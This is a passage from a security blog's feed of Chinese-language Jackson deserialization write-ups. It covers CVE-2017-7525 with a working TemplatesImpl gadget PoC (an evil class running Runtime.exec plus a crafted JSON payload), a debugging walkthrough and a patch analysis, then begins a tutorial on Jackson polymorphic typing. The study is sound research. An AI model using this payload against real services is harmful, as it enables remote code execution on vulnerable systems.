href="http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89">http://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2017-17485 Jackson 反序列化</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson 反序列化（二）CVE-2017-7525</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/</id>
    <published>2023-12-07T12:06:00.000Z</published>
    <updated>2023-12-07T12:41:02.136Z</updated>
    
    <content type="html"><![CDATA[<p>基于 TemplatesImpl 利用链</p><h2 id="0x01-影响版本"><a href="#0x01-影响版本" class="headerlink" title="0x01 影响版本"></a>0x01 影响版本</h2><p>Jackson 2.6 系列 &lt; 2.6.7.1<br>Jackson 2.7 系列 &lt; 2.7.9.1<br>Jackson 2.8 系列 &lt; 2.8.8.1</p><h2 id="0x02-限制"><a href="#0x02-限制" class="headerlink" title="0x02 限制"></a>0x02 限制</h2><p>由于是打的 TemplatesImpl 链，所以要求 JDK 版本是 7u21 或者 8u20，动态代理相关的链子，这部分之前已经分析过了</p><h2 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h2><p><strong>Test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>SimpleCalc. java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleCalc</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SimpleCalc</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;Calc&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PoC.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PoC</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> readClassStr(<span class="string">&quot;E:\\evilClass\\SimpleCalc.class&quot;</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">jsonInput</span> <span class="operator">=</span> aposToQuotes(<span class="string">&quot;&#123;\&quot;object\&quot;:[&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#123;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;transletBytecodes&#x27;:[&#x27;&quot;</span>+exp+<span class="string">&quot;&#x27;],\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;transletName&#x27;:&#x27;drun1baby&#x27;,\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#x27;outputProperties&#x27;:&#123;&#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;]\n&quot;</span> +  </span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>);  </span><br><span class="line">        System.out.printf(jsonInput);  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">        mapper.enableDefaultTyping();  </span><br><span class="line">        Test test;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            test = mapper.readValue(jsonInput, Test.class);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">aposToQuotes</span><span class="params">(String json)</span>&#123;  </span><br><span class="line">        <span class="keyword">return</span> json.replace(<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&quot;\&quot;&quot;</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readClassStr</span><span class="params">(String cls)</span> <span class="keyword">throws</span> Exception&#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(cls);  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);  </span><br><span class="line">        <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) file.length()];  </span><br><span class="line">        fileInputStream.read(bytes);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">base64Encoded</span> <span class="operator">=</span> DatatypeConverter.printBase64Binary(bytes);  </span><br><span class="line">        <span class="keyword">return</span> base64Encoded;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/Calc.png" class><p>其实这里看完代码之后马上就有一个问题：Jackson 是调用任意的构造函数与任意的 setter 方法，为什么会触发这条链子呢？</p><p>7u21 这条链子本质上其实是 TemplateImpl 类的类动态加载，配合上动态代理来打的，可是这里不论是动态代理，还是 <code>TemplatesImpl.getOutputProperties()</code>，都和 Jackson 没关系。所以这里可以说是非常疑惑了</p><h2 id="0x04-漏洞分析"><a href="#0x04-漏洞分析" class="headerlink" title="0x04 漏洞分析"></a>0x04 漏洞分析</h2><p>下断点调试</p><p>首先是第一次到 <code>com.fasterxml.jackson.databind.deser.BeanDeserializer#deserialize</code> 方法，反序列化 Test 类，会走到其构造函数里面，并且继续处理 <code>object</code></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/handleObject.png" class><p>继续往下，下一步是反序列化 <code>object</code> 里面的数据。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/beanPropertiesChange.png" class><p>这里可以看到 <code>_beanProperties</code> 属性，其中包含了哪些呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Properties=[uriresolver([simple type, <span class="keyword">class</span> <span class="title class_">javax</span>.xml.transform.URIResolver]), transletBytecodes([array type, component type: [array type, component type: [simple type, <span class="keyword">class</span> <span class="title class_">byte</span> %&#125;]), stylesheetDOM([simple type, <span class="keyword">class</span> <span class="title class_">com</span>.sun.org.apache.xalan.internal.xsltc.DOM]), transletName([simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String]), outputProperties([map type; <span class="keyword">class</span> <span class="title class_">java</span>.util.Properties, [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String] -&gt; [simple type, <span class="keyword">class</span> <span class="title class_">java</span>.lang.String %&#125;)]</span><br></pre></td></tr></table></figure><p>除了 setter 函数中的属性之外，还有 <code>outputProperties</code>，为什么 <code>outputProperties</code> 会被拿到呢？因为 <code>outputProperties</code> 属性有相应的 getter 方法，而其他属性却没有</p><p>接着来看看对于 <code>outputProperties</code> 是怎么处理的</p><p><strong>outputProperties 属性在 <code>deserializeAndSet()</code> 函数中是通过反射机制调用它的 getter 方法，这就是该利用链能被成功触发的原因</strong></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/getter.png" class><p>这里也指出了一条攻击利用手法，也就是只要构造函数中存在的属性，不存在 setter 方法时，都会自动调到 getter 方法。</p><p>从而就能够利用成功了。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/getOutputProperties.png" class><p>后续就是最基础的 TemplatesImpl 动态加载字节码的过程，不再展开了</p><h2 id="0x05-其他细节"><a href="#0x05-其他细节" class="headerlink" title="0x05 其他细节"></a>0x05 其他细节</h2><h3 id="高版本-JDK-不能触发的原因——-tfactory"><a href="#高版本-JDK-不能触发的原因——-tfactory" class="headerlink" title="高版本 JDK 不能触发的原因—— _tfactory"></a>高版本 JDK 不能触发的原因—— <code>_tfactory</code></h3><p>在大版本下，JDK1.7 和 1.8 中，<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 类是有所不同的。</p><p>当然，在小版本较高的 1.7 和某些 1.8 的还是能够成功触发的，具体的可自行测试。</p><p>区别在于新建 TransletClassLoader 类实例的代码，其中调用了 <code>_factory</code> 属性，但是该属性值我们没有在 PoC 中设置，默认为 null，于是就会抛出异常了。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/tfactory.png" class><p>而 Jackson 也是无法设置 <code>_tfactory</code> 的，因为 <code>_tfactory</code> 在原本的 <code>TemplatesImpl</code> 类中都没有 getter 或 setter 方法，这就拿不到了。</p><h2 id="0x06-补丁分析"><a href="#0x06-补丁分析" class="headerlink" title="0x06 补丁分析"></a>0x06 补丁分析</h2><p>这里将 jackson-databind-2.7.9 换成 jackson-databind-2.7.9.1。<br>尝试运行会报错如下，显示因为某些安全原因禁止了该类的加载：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/fix.png" class><p>调试分析，在调用 <code>BeanDeserializerFactory.createBeanDeserializer()</code> 函数创建 Bean 反序列化器的时候，其中会调用 <code>checkIllegalTypes()</code> 函数提取当前类名，然后使用黑名单进行过滤：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%BA%8C%EF%BC%89CVE-2017-7525/blackList.png" class><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" href="http://www.mi1k7ea.com/2019/11/16/Jackson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%94CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/">http://www.mi1k7ea.com/2019/11/16/Jackson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%94CVE-2017-7525%EF%BC%88%E5%9F%BA%E4%BA%8ETemplatesImpl%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
    <summary type="html">CVE-2017-7527 Jackson 反序列化</summary>
    
    
    
    <category term="Java" scheme="https://drun1baby.github.io/categories/Java/"/>
    
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson 反序列化（一）漏洞原理</title>
    <link href="https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/"/>
    <id>https://drun1baby.github.io/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/</id>
    <published>2023-12-07T12:05:52.000Z</published>
    <updated>2023-12-07T12:40:59.070Z</updated>
    
    <content type="html"><![CDATA[<p>迫在眉睫，用到的太多了</p><h2 id="0x01-Jackson-基本使用"><a href="#0x01-Jackson-基本使用" class="headerlink" title="0x01 Jackson 基本使用"></a>0x01 Jackson 基本使用</h2><h3 id="Jackson-简介"><a href="#Jackson-简介" class="headerlink" title="Jackson 简介"></a>Jackson 简介</h3><p>Jackson 是一个开源的Java序列化和反序列化工具，可以将 Java 对象序列化为 XML 或 JSON 格式的字符串，以及将 XML 或 JSON 格式的字符串反序列化为 Java 对象。</p><p>由于其使用简单，速度较快，且不依靠除 JDK 外的其他库，被众多用户所使用。</p><h3 id="使用-Jackson-进行序列化与反序列化"><a href="#使用-Jackson-进行序列化与反序列化" class="headerlink" title="使用 Jackson 进行序列化与反序列化"></a>使用 Jackson 进行序列化与反序列化</h3><p>使用的 Jackson 包环境为 2.7.9 版本</p><p><strong>pom.xml</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.7.9<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><p>自定义 Person 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s&quot;</span>, age, name);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着编写 Jackson 的序列化与反序列化代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JacksonTest</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();  </span><br><span class="line">        p.age = <span class="number">6</span>;  </span><br><span class="line">        p.name = <span class="string">&quot;Drunkbaby&quot;</span>;  </span><br><span class="line">        <span class="type">ObjectMapper</span> <span class="variable">mapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectMapper</span>();  </span><br><span class="line">  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> mapper.writeValueAsString(p);  </span><br><span class="line">        System.out.println(json);  </span><br><span class="line">  </span><br><span class="line">        <span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> mapper.readValue(json, Person.class);  </span><br><span class="line">        System.out.println(p2);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;&quot;age&quot;:6,&quot;name&quot;:&quot;Drunkbaby&quot;&#125;</span></span><br><span class="line"><span class="comment">// Person.age=6, Person.name=Drunkbaby</span></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%80%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/JacksonTest.png" class><h2 id="0x02-Jackson-对于多态问题的解决-——-JacksonPolymorphicDeserialization"><a href="#0x02-Jackson-对于多态问题的解决-——-JacksonPolymorphicDeserialization" class="headerlink" title="0x02 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization"></a>0x02 Jackson 对于多态问题的解决 —— JacksonPolymorphicDeserialization</h2><p>简单地说，Java 多态就是同一个接口使用不同的实例而执行不同的操作。</p><p>那么问题来了，如果对多态类的某一个子类实例在序列化后再进行反序列化时，如何能够保证反序列化出来的实例即是我们想要的那个特定子类的实例而非多态类的其他子类实例呢？—— Jackson 实现了 JacksonPolymorphicDeserialization 机制来解决这个问题。</p><p>JacksonPolymorphicDeserialization 即 Jackson 多态类型的反序列化：在反序列化某个类对象的过程中，如果类的成员变量不是具体类型（non-concrete），比如 Object、接口或抽象类，则可以在 JSON 字符串中指定其具体类型，Jackson 将生成具体类型的实例。</p><p>简单地说，就是将具体的子类信息绑定在序列化的内容中以便于后续反序列化的时候直接得到目标子类对象，其实现有两种，即 <code>DefaultTyping</code> 和 <code>@JsonTypeInfo</code> 注解。这里和前面学过的 fastjson 是很相似的。</p><p>下面具体介绍一下。</p><h3 id="DefaultTyping"><a href="#DefaultTyping" class="headerlink" title="DefaultTyping"></a>DefaultTyping</h3><p>Jackson 提供一个 enableDefaultTyping 设置，其包含 4 个值，查看 <code>jackson-databind-2.7.9.jar!/com/fasterxml/jackson/databind/ObjectMapper.java</code> 可看到相关介绍信息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">DefaultTyping</span> &#123;  </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * This value means that only properties that have  </span></span><br><span class="line"><span class="comment">        * &#123;<span class="doctag">@link</span> java.lang.Object&#125; as declared type (including  </span></span><br><span class="line"><span class="comment">        * generic types without explicit type) will use default  </span></span><br><span class="line"><span class="comment">        * typing.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       JAVA_LANG_OBJECT,  </span><br><span class="line">         </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * properties with declared type of &#123;<span class="doctag">@link</span> java.lang.Object&#125;  </span></span><br><span class="line"><span class="comment">        * or an abstract type (abstract class or interface).  </span></span><br><span class="line"><span class="comment">        * Note that this does &lt;b&gt;not&lt;/b&gt; include array types.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       OBJECT_AND_NON_CONCRETE,  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * all types covered by &#123;<span class="doctag">@link</span> #OBJECT_AND_NON_CONCRETE&#125;  </span></span><br><span class="line"><span class="comment">        * plus all array types for them.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       NON_CONCRETE_AND_ARRAYS,  </span><br><span class="line">         </span><br><span class="line">       <span class="comment">/**  </span></span><br><span class="line"><span class="comment">        * Value that means that default typing will be used for  </span></span><br><span class="line"><span class="comment">        * all non-final types, with exception of small number of  </span></span><br><span class="line"><span class="comment">        * &quot;natural&quot; types (String, Boolean, Integer, Double), which  </span></span><br><span class="line"><span class="comment">        * can be correctly inferred from JSON; as well as for  </span></span><br><span class="line"><span class="comment">        * all arrays of non-final types.  </span></span><br><span class="line"><span class="comment">        *&lt;p&gt;  </span></span><br><span class="line"><span class="comment">        * Since 2.4, this does NOT apply to &#123;<span class="doctag">@link</span> TreeNode&#125; and its subtypes.  </span></span><br><span class="line"><span class="comment">        */</span>  </span><br><span class="line">       NON_FINAL  </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>默认情况下，即无参数的 enableDefaultTyping 是第二个设置，OBJECT_AND_NON_CONCRETE。</strong></p><p>下面分别对这几个选项进行说明。</p><h4 id="JAVA-LANG-OBJECT"><a href="#JAVA-LANG-OBJECT" class="headerlink" title="JAVA_LANG_OBJECT"></a>JAVA_LANG_OBJECT</h4><p>JAVA_LANG_OBJECT：当被序列化或反序列化的类里的属性被声明为一个 Object 类型时，会对该 Object 类型的属性进行序列化和反序列化，并且明确规定类名。（当然，这个 Object 本身也得是一个可被序列化的类）</p><p>添加一个 Hacker 类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.defaultTyping;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hacker</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">String</span> <span class="variable">skill</span> <span class="operator">=</span> <span class="string">&quot;hiphop&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改 Person 类，添加 Object 类型属性：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;  </span><br><span class="line">    <span class="keyword">public</span> String name;  </span><br><span class="line">    <span class="keyword">public</span> Object object;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> String.format(<span class="string">&quot;Person.age=%d, Person.name=%s, %s&quot;</span>, age, name, object == <span class="literal">null</span> ? <span class="string">&quot;null&quot;</span> : object);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新建 <code>JAVA_LANG_OBJECTTest.java</code>，添加 <code>enableDefaultTyping()</code> 并设置为 <code>JAVA_LANG_OBJECT</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 